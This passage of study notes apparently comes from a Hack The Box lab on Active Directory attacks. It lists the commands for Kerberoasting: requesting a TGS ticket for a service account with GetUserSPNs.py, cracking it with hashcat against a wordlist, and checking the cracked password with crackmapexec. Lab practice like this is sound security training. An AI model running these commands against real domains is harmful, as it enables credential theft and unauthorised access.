...
```shell-session
slomkm@htb[/htb]$ GetUserSPNs.py -h
...
```shell-session
slomkm@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
...
```shell-session
slomkm@htb[/htb]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
...
![[Z Assets/Images/53d2d82c9dfd87d256ba5f5710c277ba_MD5.gif]]
...
```shell-session
slomkm@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
